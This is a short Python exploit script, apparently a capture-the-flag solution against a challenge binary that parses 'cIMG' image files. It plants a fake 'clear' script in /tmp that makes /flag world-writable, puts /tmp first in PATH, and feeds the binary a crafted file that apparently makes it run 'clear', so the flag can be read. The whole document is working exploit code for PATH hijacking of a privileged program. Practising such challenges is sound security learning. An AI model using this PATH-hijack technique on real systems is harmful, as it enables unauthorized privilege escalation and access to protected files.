#!/usr/bin/python3

from pwn import *
import struct
import subprocess
import sys
import os
import time

env = os.environ.copy()
env["PATH"] = "/tmp:" + env["PATH"]

data = """#!/bin/bash
chmod 777 /flag
"""

with open("/tmp/clear","w") as file:
    file.write(data)

subprocess.Popen(["chmod","+x","/tmp/clear"])

header = b"cIMG"+struct.pack("<HBBI",4,1,1,1)

payload = struct.pack("<HB",6,1)
actual = header+payload

with open("n.cimg","wb") as i:
    i.write(actual)
subprocess.Popen(["/challenge/cimg","n.cimg"],env=env)
time.sleep(3)
with open("/flag",'r') as file:
    flag = file.read()
print("FLag: ",flag)
